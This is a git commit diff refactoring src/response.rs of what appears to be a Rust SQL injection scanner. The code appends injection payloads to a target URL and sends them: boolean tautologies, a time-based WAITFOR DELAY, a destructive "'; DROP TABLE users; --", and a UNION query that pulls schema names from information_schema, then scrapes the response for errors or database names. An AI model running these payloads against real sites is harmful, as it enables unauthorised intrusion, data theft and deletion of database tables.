5c7f3068664a0fe4e817710e55f6ab9ba14530b1
joaolfp <joaolucasfp2001@gmail.com>
2024-06-06 20:27:54 -0300

    Adjust code and fix

--- src/response.rs
+++ src/response.rs
@@ -9,172 +9,83 @@ pub async fn validation_exist_sql_injection(
     payload: &str) -> Result<(), reqwest::Error> {
 
     let client = Client::new();
-
-    match payload {
-        "1" => {
-            let set_payload = "' OR '1'='1";
-
-            if let Err(error) = response(
-                client.clone(),
-                url,
-                set_payload,
-                false).await {
-
-                println!("Request error: {}", error);
-                exit(1);
-            }
-        },
-        "2" => {
-            let set_payload = "'; DROP TABLE users; --";
-
-            if let Err(error) = response(
-                client.clone(),
-                url,
-                set_payload,
-                false).await {
-
-                println!("Request error: {}", error);
-                exit(1);
-            }
-        },
-        "3" => {
-            let set_payload = "'; WAITFOR DELAY '00:00:05'--";
-
-            if let Err(error) = response(
-                client.clone(),
-                url,
-                set_payload,
-                false).await {
-
-                println!("Request error: {}", error);
-                exit(1);
-            }
-        },
-        "4" => {
-            let set_payload = "' AND 1=1 --";
-
-            if let Err(error) = response(
-                client.clone(),
-                url,
-                set_payload,
-                false).await {
-
-                println!("Request error: {}", error);
-                exit(1);
-            }
-        },
-        "5" => {
-            let set_payload = "' AND 1=0 --";
-
-            if let Err(error) = response(
-                client.clone(),
-                url,
-                set_payload,
-                false).await {
-
-                println!("Request error: {}", error);
-                exit(1);
-            }
-        },
-        "6" => {
-            let set_payload = "' OR 1=0 --";
-
-            if let Err(error) = response(
-                client.clone(),
-                url,
-                set_payload,
-                false).await {
-
-                println!("Request error: {}", error);
-                exit(1);
-            }
-        },
-        "7" => {
-            let set_payload = "' OR 1=1 --";
-
-            if let Err(error) = response(
-                client.clone(),
-                url,
-                set_payload,
-                false).await {
-
-                println!("Request error: {}", error);
-                exit(1);
-            }
-        },
-        "8" => {
-            let set_payload = "-1 union select 1, 2, group_concat(schema_name) from \
-            information_schema.schemata";
-
-            if let Err(error) = response(
-                client.clone(),
-                url,
-                set_payload,
-                true).await {
-
-                println!("Request error: {}", error);
-                exit(1);
-            }
-        }
+    let set_payload = match payload {
+        "1" => "' OR '1'='1",
+        "2" => "'; DROP TABLE users; --",
+        "3" => "'; WAITFOR DELAY '00:00:05'--",
+        "4" => "' AND 1=1 --",
+        "5" => "' AND 1=0 --",
+        "6" => "' OR 1=0 --",
+        "7" => "' OR 1=1 --",
+        "8" => "-1 union select 1, 2, group_concat(schema_name) from information_schema.schemata",
         _ => {
             println!("Options not found");
-            exit(1);
+            return Ok(());
         }
+    };
+
+    match response(&client, url, set_payload, payload == "8").await {
+        Ok(message) => println!("{}", message),
+        Err(error) => println!("Request error: {}", error),
     }
 
     Ok(())
 }
 
 async fn response(
-    client: Client,
+    client: &Client,
     url: &str,
     payload: &str,
-    show_body: bool) -> Result<(), reqwest::Error> {
+    show_body: bool) -> Result<String, reqwest::Error> {
 
     let test_url = format!("{}{}", url, payload);
     println!("{}", "Testing.....".blue());
 
-    let response = client.get(test_url).send().await?;
+    let response = client.get(&test_url).send().await?;
 
     if response.status().is_success() {
         let body = response.text().await?;
 
-        if show_body == false {
-            contains_sql_injection(body);
+        if !show_body {
+            match contains_sql_injection(&body) {
+                Ok(message) => Ok(message),
+                Err(error) => Ok(error)
+            }
         } else {
-            extract_information_schema(&body);
+            match extract_information_schema(&body) {
+                Ok(message) => Ok(message),
+                Err(error) => Ok(error)
+            }
         }
     } else {
         println!("Failed to make the request");
         exit(1);
     }
-
-    Ok(())
 }
 
-fn contains_sql_injection(body: String) {
+fn contains_sql_injection(body: &str) -> Result<String, String> {
     if body.contains("mysql_fetch_array()") || body.contains("SQL syntax") {
-        println!("{}", "[x] Vulnerable to SQL Injection".green());
+        Ok("[x] Vulnerável a SQL Injection".to_string())
     } else {
-        println!("{}", "[] No vulnerabilities found".red());
+        Err("[] Nenhuma vulnerabilidade encontrada".to_string())
     }
 }
 
-fn extract_information_schema(html_content: &str) {
+fn extract_information_schema(html_content: &str) -> Result<String, String> {
     let document = Html::parse_document(html_content);
-    let selector = Selector::parse("div, p").unwrap();
+    let selector = Selector::parse("div, p").map_err(|_| "Failed \
+    to parse selector".to_string())?;
 
-    let css_regex = Regex::new(r"\{.*?\}").unwrap();
+    let css_regex = Regex::new(r"\{.*?\}").map_err(|_| "Failed to \
+    compile regex".to_string())?;
 
     for element in document.select(&selector) {
         let text = element.text().collect::<Vec<_>>().join(" ");
 
         if text.contains("information_schema") && !css_regex.is_match(&text) {
-            println!("{}", text.trim());
-            break;
-        } else {
-            println!("Database not found");
-            exit(1);
+            return Ok(text.trim().to_string());
         }
     }
+
+    Err("Database not found".to_string())
 }
